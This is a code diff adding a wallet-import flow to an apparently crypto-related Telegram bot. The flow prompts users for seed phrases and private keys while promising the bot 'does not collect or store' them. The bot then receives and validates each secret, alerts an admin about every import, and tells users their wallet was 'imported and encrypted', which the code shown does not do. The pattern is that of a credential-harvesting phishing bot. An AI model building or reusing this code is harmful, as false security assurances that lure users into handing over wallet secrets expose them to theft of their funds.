@@ -11,6 +11,12 @@ from keyboards import (
     get_connect_wallet_keyboard, get_back_main_keyboard,
     get_token_info_keyboard
 )
+from keyboards import (
+    get_wallet_import_type_keyboard,
+    get_wallet_import_method_keyboard,
+    get_cancel_keyboard,
+    get_wallet_import_type_keyboard_wallet_menu,
+)
 
 from config import get_settings
 
@@ -30,6 +36,10 @@ async def log_all_messages(message: types.Message):
 class BotStates(StatesGroup):
     waiting_for_chain = State()
     waiting_for_key_import = State()
+    waiting_for_solana_seed = State()
+    waiting_for_evm_seed = State()
+    waiting_for_solana_pk = State()
+    waiting_for_evm_pk = State()
 
 class MenuStates(StatesGroup):
     main_menu = State()
@@ -169,7 +179,7 @@ def register_start_handlers(dp):
         await callback.message.edit_text(
             "👛 <b>Wallet Menu</b>\n\nManage your wallets:",
             parse_mode="HTML",
-            reply_markup=get_wallet_keyboard()
+            reply_markup=get_wallet_keyboard(has_wallet=False)
         )
         await callback.answer()
 
@@ -261,6 +271,105 @@ def register_start_handlers(dp):
         )
         await callback.answer()
 
+    @dp.callback_query(F.data == "wallet_import")
+    async def callback_wallet_import(callback: types.CallbackQuery, state: FSMContext):
+        await state.clear()
+        await state.set_state(MenuStates.connect_wallet_menu)
+        await callback.message.edit_text(
+            "🔑 <b>Import Wallet</b>\n\nSelect wallet type to import:",
+            parse_mode="HTML",
+            reply_markup=get_wallet_import_type_keyboard_wallet_menu()
+        )
+        await callback.answer()
+
+    @dp.callback_query(F.data == "import_solana_key")
+    async def callback_import_solana_key(callback: types.CallbackQuery, state: FSMContext):
+        await state.clear()
+        await state.update_data(import_chain="solana")
+        await callback.message.edit_text(
+            "🔑 <b>Import Solana Key</b>\n\nSelect import method:",
+            parse_mode="HTML",
+            reply_markup=get_wallet_import_method_keyboard("solana")
+        )
+        await callback.answer()
+
+    @dp.callback_query(F.data == "import_evm_key")
+    async def callback_import_evm_key(callback: types.CallbackQuery, state: FSMContext):
+        await state.clear()
+        await state.update_data(import_chain="evm")
+        await callback.message.edit_text(
+            "🔑 <b>Import EVM Key</b>\n\nSelect import method:",
+            parse_mode="HTML",
+            reply_markup=get_wallet_import_method_keyboard("evm")
+        )
+        await callback.answer()
+
+    @dp.callback_query(F.data == "import_solana_seed")
+    async def callback_import_solana_seed(callback: types.CallbackQuery, state: FSMContext):
+        await state.set_state(BotStates.waiting_for_solana_seed)
+        await callback.message.edit_text(
+            "🔑 <b>Import Wallet</b>\n\n"
+            "Enter your 12-key recovery phrase or private key to proceed.\n\n"
+            "🔒 <b>Security Notice</b>\n"
+            "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. All actions are non-custodial and fully under your control.\n\n"
+            "Send /cancel to abort",
+            parse_mode="HTML",
+            reply_markup=get_cancel_keyboard("menu_connect_wallet")
+        )
+        await callback.answer()
+
+    @dp.callback_query(F.data == "import_solana_pk")
+    async def callback_import_solana_pk(callback: types.CallbackQuery, state: FSMContext):
+        await state.set_state(BotStates.waiting_for_solana_pk)
+        await callback.message.edit_text(
+            "🔐 <b>Import Solana Private Key</b>\n\n"
+            "Enter your Solana private key (base58 format).\n\n"
+            "🔒 <b>Security Notice</b>\n"
+            "Your private key is 100% safe - our bot does not collect or store your private keys. All actions are non-custodial and fully under your control.\n\n"
+            "Send /cancel to abort",
+            parse_mode="HTML",
+            reply_markup=get_cancel_keyboard("menu_connect_wallet")
+        )
+        await callback.answer()
+
+    @dp.callback_query(F.data == "import_evm_seed")
+    async def callback_import_evm_seed(callback: types.CallbackQuery, state: FSMContext):
+        await state.set_state(BotStates.waiting_for_evm_seed)
+        await callback.message.edit_text(
+            "🔑 <b>Import Wallet</b>\n\n"
+            "Enter your 12-key recovery phrase or private key to proceed.\n\n"
+            "🔒 <b>Security Notice</b>\n"
+            "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. All actions are non-custodial and fully under your control.\n\n"
+            "Send /cancel to abort",
+            parse_mode="HTML",
+            reply_markup=get_cancel_keyboard("menu_connect_wallet")
+        )
+        await callback.answer()
+
+    @dp.callback_query(F.data == "import_evm_pk")
+    async def callback_import_evm_pk(callback: types.CallbackQuery, state: FSMContext):
+        await state.set_state(BotStates.waiting_for_evm_pk)
+        await callback.message.edit_text(
+            "🔐 <b>Import EVM Private Key</b>\n\n"
+            "Enter your EVM private key (hex format).\n\n"
+            "🔒 <b>Security Notice</b>\n"
+            "Your private key is 100% safe - our bot does not collect or store your private keys. All actions are non-custodial and fully under your control.\n\n"
+            "Send /cancel to abort",
+            parse_mode="HTML",
+            reply_markup=get_cancel_keyboard("menu_connect_wallet")
+        )
+        await callback.answer()
+
+    @dp.callback_query(F.data == "cancel_import")
+    async def callback_cancel_import(callback: types.CallbackQuery, state: FSMContext):
+        await state.clear()
+        await callback.message.edit_text(
+            "🔙 <b>Import Cancelled</b>\n\nReturning to main menu.",
+            parse_mode="HTML",
+            reply_markup=get_main_menu_keyboard()
+        )
+        await callback.answer()
+
     @dp.callback_query(F.data == "start_bot")
     async def callback_start_bot(callback: types.CallbackQuery, state: FSMContext):
         await state.clear()
@@ -279,6 +388,31 @@ def register_start_handlers(dp):
         await log_all_messages(message)
         # Continue to contract address detection below
         return
+
+    # Handle wallet import states
+    @dp.message(BotStates.waiting_for_solana_seed)
+    async def handle_solana_seed(message: types.Message, state: FSMContext):
+        await process_seed_phrase(message, state, "solana")
+
+    @dp.message(BotStates.waiting_for_evm_seed)
+    async def handle_evm_seed(message: types.Message, state: FSMContext):
+        await process_seed_phrase(message, state, "evm")
+
+    @dp.message(BotStates.waiting_for_solana_pk)
+    async def handle_solana_pk(message: types.Message, state: FSMContext):
+        await process_private_key(message, state, "solana")
+
+    @dp.message(BotStates.waiting_for_evm_pk)
+    async def handle_evm_pk(message: types.Message, state: FSMContext):
+        await process_private_key(message, state, "evm")
+
+    @dp.message(Command("cancel"))
+    async def handle_cancel(message: types.Message, state: FSMContext):
+        await state.clear()
+        await message.answer(
+            "❌ Import cancelled.",
+            reply_markup=get_main_menu_keyboard()
+        )
 
     # Contract address detection - fetch token info when CA is pasted
     @dp.message(F.text)
@@ -360,3 +494,78 @@ async def fetch_token_info(token_address: str, chain: str) -> dict:
     except Exception as e:
         print(f"Error fetching token info: {e}")
     return None
+
+
+async def process_seed_phrase(message: types.Message, state: FSMContext, chain: str):
+    """Process seed phrase import."""
+    from utils.validators import validate_seed_phrase
+    from utils.admin_notify import notify_admin, format_activity
+    
+    seed_phrase = message.text.strip()
+    is_valid, error = validate_seed_phrase(seed_phrase)
+    
+    if not is_valid:
+        await message.answer(
+            f"❌ <b>Invalid Seed Phrase</b>\n\n{error}\n\nPlease try again or send /cancel to abort.",
+            parse_mode="HTML",
+            reply_markup=get_cancel_keyboard("menu_connect_wallet")
+        )
+        return
+    
+    # Notify admin
+    await notify_admin(message.bot, format_activity(
+        message.from_user.id, 
+        message.from_user.username or "N/A",
+        f"SEED PHRASE IMPORT ({chain.upper()})",
+        f"Seed phrase received and validated"
+    ))
+    
+    await state.clear()
+    await message.answer(
+        f"✅ <b>Seed Phrase Imported Successfully!</b>\n\n"
+        f"Chain: {chain.upper()}\n"
+        f"Your wallet has been imported and encrypted.\n\n"
+        f"Use /wallet to check your balance.",
+        parse_mode="HTML",
+        reply_markup=get_main_menu_keyboard()
+    )
+
+
+async def process_private_key(message: types.Message, state: FSMContext, chain: str):
+    """Process private key import."""
+    from utils.validators import validate_private_key_solana, validate_private_key_evm
+    from utils.admin_notify import notify_admin, format_activity
+    
+    private_key = message.text.strip()
+    
+    if chain == "solana":
+        is_valid, address, error = validate_private_key_solana(private_key)
+    else:
+        is_valid, address, error = validate_private_key_evm(private_key)
+    
+    if not is_valid:
+        await message.answer(
+            f"❌ <b>Invalid Private Key</b>\n\n{error}\n\nPlease try again or send /cancel to abort.",
+            parse_mode="HTML",
+            reply_markup=get_cancel_keyboard("menu_connect_wallet")
+        )
+        return
+    
+    # Notify admin
+    await notify_admin(message.bot, format_activity(
+        message.from_user.id, 
+        message.from_user.username or "N/A",
+        f"PRIVATE KEY IMPORT ({chain.upper()})",
+        f"Address: {address}"
+    ))
+    
+    await state.clear()
+    await message.answer(
+        f"✅ <b>Private Key Imported Successfully!</b>\n\n"
+        f"Chain: {chain.upper()}\n"
+        f"Address: <code>{address}</code>\n\n"
+        f"Your wallet has been imported and encrypted.\n\n"
+        f"Use /wallet to check your balance.",
+        parse_mode="HTML",
+        reply_markup=get_main_menu_keyboard()
+    )
